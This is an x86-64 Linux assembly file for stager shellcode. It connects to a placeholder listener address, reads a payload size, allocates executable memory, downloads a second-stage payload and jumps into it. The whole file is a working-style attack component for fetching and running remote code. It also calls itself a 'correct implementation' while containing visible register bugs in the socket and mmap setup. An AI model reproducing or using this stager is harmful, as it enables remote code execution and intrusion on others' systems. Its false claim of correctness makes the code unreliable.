; Linux x64 Stager Shellcode — Correct Implementation
; ~110 bytes — connects to listener, downloads and executes stage
;
; Protocol:
;   1. Connect to LHOST:LPORT
;   2. Read 4 bytes (stage size, little-endian)
;   3. Allocate RWX memory (mmap)
;   4. Read stage_size bytes into allocated memory
;   5. Jump to stage
;
; Placeholders:
;   IP: 0x7f7f7f7f (dword, pushed as-is)
;   Port: 0x7e7e (word, network byte order)

bits 64
global _start

_start:
    ; ── Socket ───────────────────────────────────────────────────────
    ; socket(AF_INET, SOCK_STREAM, 0) → r12 = sockfd
    xor rdi, rdi
    push rdi
    pop rsi
    mov edi, 2              ; AF_INET
    mov dl, 1               ; SOCK_STREAM
    push 41                 ; sys_socket
    pop rax
    syscall

    mov r12, rax            ; r12 = sockfd (saved!)

    ; ── Connect ──────────────────────────────────────────────────────
    ; connect(sockfd, &sockaddr, 16)
    push rsi                ; sin_zero (8 bytes of 0)
    push rsi
    push dword 0x7f7f7f7f   ; IP placeholder
    push word 0x7e7e        ; Port placeholder
    push word 2             ; AF_INET
    mov rsi, rsp            ; rsi = &sockaddr
    mov rdi, r12            ; rdi = sockfd
    push 16
    pop rdx
    push 42                 ; sys_connect
    pop rax
    syscall

    ; ── Read stage size (4 bytes) ───────────────────────────────────
    ; read(sockfd, rsp, 4)
    mov rdi, r12            ; fd = sockfd
    push 4                  ; push count onto stack
    mov rsi, rsp            ; buf = &stage_size (on stack)
    push 0                  ; sys_read
    pop rax
    syscall

    ; ── Read stage_size value ───────────────────────────────────────
    pop r8                  ; r8 = stage_size

    ; ── Allocate RWX memory ─────────────────────────────────────────
    ; mmap(NULL, stage_size, 7, 0x22, -1, 0)
    xor rdi, rdi            ; addr = NULL
    mov rsi, r8             ; len = stage_size
    mov edx, 7              ; PROT_READ | PROT_WRITE | PROT_EXEC
    mov r10d, 0x22          ; MAP_PRIVATE | MAP_ANONYMOUS
    mov r8d, -1             ; fd = -1
    xor r9d, r9d            ; offset = 0
    push 9                  ; sys_mmap
    pop rax
    syscall

    test rax, rax
    js exit_fail

    ; rax = allocated memory address
    mov r13, rax            ; r13 = stage address

    ; ── Read stage into memory ──────────────────────────────────────
    ; read(sockfd, stage_addr, stage_size)
    mov rdi, r12            ; fd = sockfd
    mov rsi, r13            ; buf = stage_addr
    mov rdx, r8             ; count = stage_size
    push 0                  ; sys_read
    pop rax
    syscall

    ; ── Execute stage ───────────────────────────────────────────────
    jmp r13                 ; Jump to stage!

exit_fail:
    ; Exit gracefully if something failed
    push 60                 ; sys_exit
    pop rax
    xor rdi, rdi
    syscall
